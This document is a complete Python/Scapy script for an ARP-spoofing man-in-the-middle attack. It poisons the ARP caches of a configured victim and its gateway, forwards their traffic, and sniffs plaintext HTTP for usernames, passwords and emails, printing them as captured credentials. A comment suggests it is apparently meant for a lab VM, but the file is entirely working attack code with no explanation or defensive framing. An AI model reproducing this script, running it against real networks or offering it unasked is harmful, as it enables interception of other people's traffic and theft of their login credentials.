from scapy.all import *
import os
import sys
import time

# Configuration
# ------------------------------------------------------------------
# YOU WILL EDIT THESE ON THE VM LATER
VICTIM_IP = "192.168.1.100"  
GATEWAY_IP = "192.168.1.1" 
INTERFACE = "eth0"
# ------------------------------------------------------------------

def enable_ip_forwarding():
    """ Enables IP forwarding to prevent the victim from losing internet. """
    print("[*] Enabling IP Forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(ip):
    """ Returns the MAC address of a specific IP. """
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False, iface=INTERFACE)
    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    """ Sends a fake ARP packet to the target. """
    target_mac = get_mac(target_ip)

    if not target_mac:
        
        print(f"[!] Could not find MAC address for {target_ip}")
        return
    # Create ARP packet: "I am spoof_ip, but my MAC is this machine's MAC"
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False, iface=INTERFACE)

def restore(dest_ip, source_ip):
    """ Restores the ARP table to normal. """
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False, iface=INTERFACE)

def packet_callback(packet):
    """ Inspects packets for HTTP data (Passwords/Usernames). """
    if packet.haslayer(HTTPRequest):
        try:
            url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
            print(f"[+] HTTP Request: {url}")

            if packet.haslayer(Raw):
                load = packet[Raw].load.decode(errors='ignore')
                keywords = ["username", "user", "login", "password", "pass", "email"]
                for keyword in keywords:
                    if keyword in load:
                        print(f"\n[!!!] POSSIBLE CREDENTIALS CAPTURED:\n{load}\n")
                        break
        except Exception as e:
            pass

def run_attack():
    enable_ip_forwarding()
    try:
        print(f"[*] Resolving MAC addresses for {VICTIM_IP} and {GATEWAY_IP}...")
        victim_mac = get_mac(VICTIM_IP)
        gateway_mac = get_mac(GATEWAY_IP)

        if not victim_mac or not gateway_mac:
            print("[-] Could not find targets. Check IPs and ensure machines are ON.")
            sys.exit(1)

        print(f"[*] Starting Attack on {VICTIM_IP}...")
        print("[*] Press CTRL+C to stop and restore network.\n")

        # Start Sniffer in background (non-blocking)
        sniffer = AsyncSniffer(iface=INTERFACE, prn=packet_callback, filter="tcp port 80", store=False)
        sniffer.start()

        # Loop ARP Spoofing
        while True:
            spoof(VICTIM_IP, GATEWAY_IP) # Tell Victim I am Router
            spoof(GATEWAY_IP, VICTIM_IP) # Tell Router I am Victim
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C. Restoring ARP tables...")
        restore(VICTIM_IP, GATEWAY_IP)
        restore(GATEWAY_IP, VICTIM_IP)
        print("[*] Network restored. Exiting.")

if __name__ == "__main__":
    run_attack()